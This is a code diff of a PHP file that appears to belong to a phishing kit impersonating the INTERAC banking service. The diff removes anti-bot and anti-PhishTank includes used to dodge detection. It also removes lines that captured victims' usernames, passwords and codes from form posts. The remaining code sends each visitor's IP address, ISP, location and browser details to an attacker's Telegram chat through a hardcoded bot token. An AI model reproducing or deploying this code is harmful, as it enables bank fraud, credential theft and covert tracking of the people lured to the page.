@@ -1,29 +1,4 @@
 <?php
-        include "/anti-bot/Bot-Spox.php";
-        include "/anti-bot/Dila_DZ.php";
-        include "/anti-bot/Fuck-you.php";
-        include "/anti-bot/index.php";
-        include "/anti-bot/IP-BlackList.php";
-        include "/anti-bot/new.php";
-        include "/anti-bot/proxyblock.php";
-        include "/anti-bot/whitelist.dat";
-        include "/anti-bot/#1.php";
-        include "/anti-bot/#2.php";
-        include "/anti-bot/#3.php";
-        include "/anti-bot/#4.php";
-        include "/anti-bot/#5.php";
-        include "/anti-bot/#6.php";
-        include "/anti-bot/#7.php";
-        include "/anti-bot/#8.php";
-        include "/anti-bot/#9.php";
-        include "/anti-bot/#10.php";
-        include "/anti-bot/#11.php";
-        include "/anti-bot/#12.php";
-        include "/anti-bot/antibot_host.php";
-        include "/anti-bot/antibot_ip.php";
-        include "/anti-bot/antibot_phishtank.php";
-        include "/anti-bot/antibot_proxy.php";
-        include "/anti-bot/antibot_userAgent.php";
 $full_date = date("h:i:s|M/d/Y");
 $time = date("h:i:s");
 $date = date("M/d/Y");
@@ -162,23 +137,21 @@ if ($success==false) {
     $crn        = $details['currency'];
     $type       = $tp;
     $bank       = "INTERAC";
-    $user       = $_POST['username'];
-    $pass       = $_POST['password'];
-    $code       = $_POST['code']; 
-    $mapurl     = "[maps.google.com/?q=$la$lh$lp]";
     $isp        = $is;
     $currency   = "".$full_date;
 	$lh     = "|";
         $li     = ",";
 
-$message ="$bank \n$ip\n$bsr$lh$uos\n$is\n$city$lh$country\n$la$li$lp\n\n$uaget";
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$message ="Your $bank WAS OPENED BY $ip\n\n\n\n$bsr$lh$uos\n$is\n$city$lh$country\n$la$li$lp\n\n$uaget";
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA";
 $data = [
-    'chat_id' => '-1001831940786',
+    'chat_id' => '-821080105',
     'text' => $message
 ];
+
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-                                 http_build_query($data) );
+    http_build_query($data));
+
 } else {
     $status     = "Status : ".$success;
     fwrite($fp, $status."\n");
